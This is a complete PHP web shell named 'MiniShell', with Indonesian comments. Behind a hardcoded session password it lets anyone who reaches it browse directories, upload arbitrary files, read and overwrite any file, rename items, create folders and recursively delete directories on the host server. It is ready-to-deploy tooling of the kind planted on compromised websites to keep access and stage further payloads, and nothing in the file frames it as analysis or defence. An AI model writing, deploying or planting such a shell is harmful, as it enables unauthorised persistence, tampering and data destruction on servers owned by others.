<?php
// PHP MiniShell - Versi Ringan dan Sederhana
// Password (UBAH INI)
$p = 'mini_secret'; 

// Cek autentikasi sesi (tetap menggunakan sesi agar tidak perlu password di URL)
session_start();
if (isset($_POST['p']) && $_POST['p'] === $p) {
    $_SESSION['auth'] = true;
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    echo '<form method="POST">Password: <input type="password" name="p"><input type="submit" value="Login"></form>';
    exit;
}

// Menentukan direktori kerja
$d = isset($_GET['d']) ? $_GET['d'] : getcwd();
@chdir($d);
$d = getcwd();

echo "<html><body><h1>MiniShell</h1>";
echo "<h2>Dir: <a href='?d=" . urlencode(dirname($d)) . "'>..</a> / " . htmlspecialchars($d) . "</h2>";

$msg = '';

// --- FUNGSI UTAMA ---

// 1. Unggah File
if (isset($_FILES['f_up'])) {
    if (move_uploaded_file($_FILES['f_up']['tmp_name'], basename($_FILES['f_up']['name']))) {
        $msg = "File uploaded: " . basename($_FILES['f_up']['name']);
    } else {
        $msg = "Upload failed.";
    }
}

// 2. Edit & Buat File
if (isset($_POST['a']) && $_POST['a'] === 'edit_save') {
    if (@file_put_contents($_POST['f'], $_POST['c']) !== false) {
        $msg = "File saved: " . $_POST['f'];
    } else {
        $msg = "Save failed: " . $_POST['f'];
    }
}

// 3. Ganti Nama
if (isset($_POST['a']) && $_POST['a'] === 'rename') {
    if (@rename($_POST['old'], $_POST['new'])) {
        $msg = "Renamed: " . $_POST['old'] . " to " . $_POST['new'];
    } else {
        $msg = "Rename failed.";
    }
}

// 4. Buat Folder
if (isset($_POST['a']) && $_POST['a'] === 'mkdir') {
    if (@mkdir($_POST['f'])) {
        $msg = "Folder created: " . $_POST['f'];
    } else {
        $msg = "Folder creation failed.";
    }
}

// 5. Hapus File/Folder
if (isset($_GET['a']) && $_GET['a'] === 'rm') {
    $f = $_GET['f'];
    if (is_dir($f)) {
        // Hapus rekursif sederhana
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($f, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        $ok = true;
        foreach ($it as $info) {
            $fn = ($info->isDir() ? 'rmdir' : 'unlink');
            if (!@$fn($info->getRealPath())) { $ok = false; }
        }
        if ($ok && @rmdir($f)) {
            $msg = "Folder deleted: " . $f;
        } else {
            $msg = "Folder deletion failed: " . $f;
        }
    } elseif (@unlink($f)) {
        $msg = "File deleted: " . $f;
    } else {
        $msg = "Deletion failed: " . $f;
    }
}

// --- TAMPILAN STATUS ---
if ($msg) {
    echo "<h3>[STATUS] " . htmlspecialchars($msg) . "</h3>";
}

// --- FORMULIR UNTUK AKSI ---
echo "<h3>ACTIONS</h3>";

// Upload
echo "<form method='POST' enctype='multipart/form-data'>Upload: <input type='file' name='f_up'><input type='submit' value='Upload'></form><br>";

// Rename
echo "<form method='POST'><input type='hidden' name='a' value='rename'>Rename: <input type='text' name='old' placeholder='Old Name'> to <input type='text' name='new' placeholder='New Name'><input type='submit' value='Rename'></form><br>";

// Mkdir
echo "<form method='POST'><input type='hidden' name='a' value='mkdir'>Mkdir: <input type='text' name='f' placeholder='Folder Name'><input type='submit' value='Mkdir'></form><br>";


// --- DAFTAR FILE ---
echo "<h3>FILES</h3><pre>";

$files = @scandir('.');
if ($files) {
    $folders = array();
    $f_list = array();

    foreach ($files as $entry) {
        if ($entry == '.' || $entry == '..') continue;
        if (is_dir($entry)) {
            $folders[] = $entry;
        } else {
            $f_list[] = $entry;
        }
    }
    
    sort($folders);
    sort($f_list);

    foreach ($folders as $f) {
        echo "[DIR] <a href='?d=" . urlencode(realpath($f)) . "'>" . htmlspecialchars($f) . "</a> (<a href='?d=" . urlencode($d) . "&a=rm&f=" . urlencode($f) . "'>DEL</a>)<br>";
    }

    foreach ($f_list as $f) {
        echo "[FILE] " . htmlspecialchars($f) . " (<a href='?d=" . urlencode($d) . "&f=" . urlencode($f) . "'>EDIT</a> | <a href='?d=" . urlencode($d) . "&a=rm&f=" . urlencode($f) . "'>DEL</a>)<br>";
    }
} else {
    echo "Cannot read directory.";
}

echo "</pre>";

// --- FORM EDIT/CREATE ---
if (isset($_GET['f'])) {
    $file_to_edit = $_GET['f'];
    $content = @file_get_contents($file_to_edit);

    echo "<h3>EDIT: " . htmlspecialchars($file_to_edit) . "</h3>";
    echo "<form method='POST'><input type='hidden' name='a' value='edit_save'><input type='hidden' name='f' value='" . htmlspecialchars($file_to_edit) . "'>";
    echo "<textarea name='c' rows='20' cols='100'>" . htmlspecialchars($content) . "</textarea><br>";
    echo "<input type='submit' value='Save File'></form>";
}

echo "</body></html>";
?>
